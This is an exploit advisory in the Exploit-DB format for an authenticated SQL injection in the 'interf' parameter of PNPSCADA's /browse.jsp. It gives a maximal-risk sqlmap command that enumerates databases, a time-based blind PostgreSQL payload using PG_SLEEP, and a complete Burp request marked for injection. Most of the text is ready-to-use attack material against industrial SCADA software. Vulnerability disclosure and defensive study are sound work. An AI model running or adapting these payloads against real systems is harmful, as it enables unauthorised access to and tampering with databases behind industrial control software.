@@ -1,0 +1,57 @@
+# Exploit Title: PNPSCADA 2.200816204020 - 'interf' SQL Injection (Authenticated)
+# Google Dork: -
+# Date: 2020-08-17
+# Exploit Author: İsmail ERKEK
+# Vendor Homepage: http://wiki.pnpscada.com/forumHome.jsp
+# Version: 2.200816204020
+# Tested on: -
+
+
+1. Description:
+----------------------
+
+PNPSCADA  2.200816204020 allows SQL Injection via parameter 'interf' in
+/browse.jsp. Exploiting this issue could allow an attacker to compromise
+the application, access or modify data, or exploit latent vulnerabilities
+in the underlying database.
+
+2. Proof of Concept:
+----------------------
+
+In Burpsuite intercept the request from one of the affected pages with
+'interf' parameter and save it like fuel.req Then run SQLmap to extract the
+data from the database:
+
+sqlmap -r req-pnp-browse.txt --risk=3 --level=5 --dbs --random-agent
+
+3. Example payload:
+----------------------
+
+(time-based blind)
+
+memh=803509994960085058&searchStr=&replaceId=k1&multiple=yes&interf=115 AND
+6380=(SELECT 6380 FROM PG_SLEEP(5))&page=1&mselect=98831
+
+4. Burpsuite request:
+----------------------
+
+POST /browse.jsp HTTP/1.1
+Host: 127.0.0.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;
+Trident/5.0)
+Connection: close
+Referer:
+http://127.0.0.1/browse.jsp?memh=2510775194362297745&interf=115&replaceId=k1&multiple=yes
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 93
+Cookie: wiki=; psl=7465737433; JSESSIONID=1ojrclvd94cpfebapnqebli37
+
+memh=803509994960085058&searchStr=*&replaceId=k1&multiple=yes&interf=115*&page=1&mselect=98831
+
+
+
+Best Regards.
+Ek alanı
